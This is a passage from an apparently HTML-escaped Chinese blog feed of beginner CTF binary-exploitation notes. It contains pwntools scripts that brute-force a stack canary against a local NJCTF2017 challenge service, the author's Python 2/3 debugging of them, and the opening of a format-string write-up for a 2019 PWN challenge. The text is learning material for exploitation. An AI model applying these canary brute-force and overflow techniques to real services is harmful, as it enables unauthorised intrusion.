&lt;p&gt;​		首先,问题在data &amp;#x3D; io.recvline(), 这个不行,可能是回复的没有换行符? recv就可以了! data &amp;#x3D; io.recv(1024),然后问题和之前一样,比特字符和字符串比较不行,需要统一格式!&lt;/p&gt;
&lt;p&gt;经过修改后的&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; socket&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;leak_canary&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;global&lt;/span&gt; canary&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    canary = &lt;span class=&#34;string&#34;&gt;&amp;#x27;\x00&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;30&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;35&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        io = remote(&lt;span class=&#34;string&#34;&gt;&amp;quot;127.0.0.1&amp;quot;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;5555&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        io.recv()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        io.send(&lt;span class=&#34;string&#34;&gt;b&amp;quot;A&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;104&lt;/span&gt; +  &lt;span class=&#34;built_in&#34;&gt;bytes&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(i),&lt;span class=&#34;string&#34;&gt;&amp;#x27;utf-8&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;#print(senddata)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;这是第&amp;quot;&lt;/span&gt;+&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(i)+&lt;span class=&#34;string&#34;&gt;&amp;quot;个&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            io.recv()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            canary += &lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(x)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;success&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;this is&amp;quot;&lt;/span&gt;+&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(x))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(x))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;except&lt;/span&gt;: &lt;span class=&#34;keyword&#34;&gt;continue&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;finally&lt;/span&gt;: io.close()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;pwn&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io = remote(&lt;span class=&#34;string&#34;&gt;&amp;quot;127.0.0.1&amp;quot;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;5555&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.recv&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(io.recvline())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; __name__ == &lt;span class=&#34;string&#34;&gt;&amp;#x27;__main__&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    leak_canary()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    pwn()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/Alex_andra/article/details/105923008&#34;&gt;https://blog.csdn.net/Alex_andra/article/details/105923008&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Python2:”A” * 104 + chr(i)&lt;/p&gt;
&lt;p&gt;Python3:b”A”*104 +  bytes(chr(i),’utf-8’)&lt;/p&gt;
&lt;p&gt;为什么它们的输出不一样&lt;/p&gt;
&lt;p&gt;打印字符的编码类型看看?&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;oot@VM-&lt;span class=&#34;number&#34;&gt;24&lt;/span&gt;-&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;-ubuntu:/home/ubuntu/ctfquanwei/REPL-master/Canary/NJCTF2017_messager&lt;span class=&#34;comment&#34;&gt;# python2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Python &lt;span class=&#34;number&#34;&gt;2.7&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.17&lt;/span&gt; (default, Feb &lt;span class=&#34;number&#34;&gt;27&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;2021&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;15&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;58&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[GCC &lt;span class=&#34;number&#34;&gt;7.5&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;] on linux2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;Type&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;help&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;copyright&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;credits&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;license&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; more information.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; sys,locale&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;sys.getdefaultencoding()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;ascii&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;q&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Traceback (most recent call last):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  File &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;stdin&amp;gt;&amp;quot;&lt;/span&gt;, line &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &amp;lt;module&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;NameError: name &lt;span class=&#34;string&#34;&gt;&amp;#x27;q&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; defined&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;quit()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;root@VM-&lt;span class=&#34;number&#34;&gt;24&lt;/span&gt;-&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;-ubuntu:/home/ubuntu/ctfquanwei/REPL-master/Canary/NJCTF2017_messager&lt;span class=&#34;comment&#34;&gt;# python3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Python &lt;span class=&#34;number&#34;&gt;3.8&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt; (default, Dec  &lt;span class=&#34;number&#34;&gt;9&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;2021&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;17&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;53&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;27&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[GCC &lt;span class=&#34;number&#34;&gt;8.4&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;] on linux&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;Type&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;help&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;copyright&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;credits&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;license&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; more information.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; sys,locale&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;sys.getdefaultencoding()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;utf-8&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;







&lt;p&gt;万能的chatgpt…………………………牛的&lt;/p&gt;
&lt;p&gt;让chatgpt把python2的代码修改成python3的就可以了…………&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-8-os%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6canary/image-20230219114331999.png&#34; alt=&#34;image-20230219114331999&#34;&gt;&lt;/p&gt;
&lt;p&gt;我之前也是这么做的呀,&lt;font color=&#34;red&#34;&gt;只是没有canary的\x00那个值,为什么就不行呢? 果然是因为这个……&lt;/font&gt;&lt;/p&gt;
&lt;p&gt;所以问题不在于编码,而在于这个\x00&lt;/p&gt;
&lt;p&gt;python3&lt;/p&gt;
&lt;p&gt;python可以打印数据类型,打印一下,也可以打印一下十六进制看看吧&lt;/p&gt;
&lt;p&gt;b’AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00”‘&lt;br&gt;&amp;lt;class ‘bytes’&amp;gt;&lt;br&gt;success&lt;br&gt;this is 34&lt;/p&gt;
&lt;p&gt;不加canary也是bytes,所以和数据类型应该没关系&lt;/p&gt;
&lt;p&gt;打印字节流的十六进制&lt;/p&gt;
&lt;p&gt;………..0x410x410x410x00x21&lt;/p&gt;
&lt;p&gt;对python2来说&lt;/p&gt;
&lt;p&gt;&amp;lt;type ‘str’&amp;gt;&lt;br&gt;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00&lt;br&gt;this is34&lt;br&gt;“&lt;br&gt;success&lt;br&gt;this is34&lt;br&gt;“&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;brute_canary&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;global&lt;/span&gt; canary&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    canary = &lt;span class=&#34;string&#34;&gt;&amp;#x27;\x00&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; xrange(&lt;span class=&#34;number&#34;&gt;30&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;35&lt;/span&gt;): &lt;span class=&#34;comment&#34;&gt;# 2 ** 8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        io = remote(&lt;span class=&#34;string&#34;&gt;&amp;quot;127.0.0.1&amp;quot;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;5555&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        io.recvuntil(&lt;span class=&#34;string&#34;&gt;b&amp;quot;Welcome!\n&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        io.send(&lt;span class=&#34;string&#34;&gt;&amp;quot;A&amp;quot;&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;104&lt;/span&gt; + canary + &lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(x))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            io.recv()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            canary += &lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(x)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;success&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;this is&amp;quot;&lt;/span&gt;+&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(x))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(x))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;except&lt;/span&gt;: &lt;span class=&#34;keyword&#34;&gt;continue&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;finally&lt;/span&gt;: io.close()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; __name__ == &lt;span class=&#34;string&#34;&gt;&amp;#x27;__main__&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    brute_canary()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

</content>
        <category term="PWN入门" />
        <updated>2023-02-18T03:05:31.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-7-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A01/</id>
        <title>pwn入门-7-格式化字符串题目练习1</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-7-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A01/"/>
        <content type="html">&lt;h1 id=&#34;第五空间2019-决赛-PWN5&#34;&gt;&lt;a href=&#34;#第五空间2019-决赛-PWN5&#34; class=&#34;headerlink&#34; title=&#34;[第五空间2019 决赛]PWN5&#34;&gt;&lt;/a&gt;[第五空间2019 决赛]PWN5&lt;/h1&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-7-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A01/image-20230217110900326.png&#34; alt=&#34;image-20230217110900326&#34; style=&#34;zoom: 25%;&#34;&gt;

&lt;p&gt;第一个感觉是 利用第一个name的输入把&amp;#x2F;dev&amp;#x2F;urandom的值修改了,然后passwd输入这个值就可以了&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;root@VM&lt;span class=&#34;number&#34;&gt;-24&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-10&lt;/span&gt;-ubuntu:/home/ubuntu/str/pwn5&lt;span class=&#34;meta&#34;&gt;# checksec pwn&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] &lt;span class=&#34;string&#34;&gt;&amp;#x27;/home/ubuntu/str/pwn5/pwn&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Arch:     i386&lt;span class=&#34;number&#34;&gt;-32&lt;/span&gt;-little&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    RELRO:    Partial RELRO&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Stack:    Canary found&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    NX:       NX enabled&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    PIE:      No &lt;span class=&#34;title function_&#34;&gt;PIE&lt;/span&gt; &lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;number&#34;&gt;0x8048000&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;整体的思路是,&lt;/p&gt;
&lt;p&gt;1.找到要修改的值的地址,把这个地址写入栈中&lt;/p&gt;
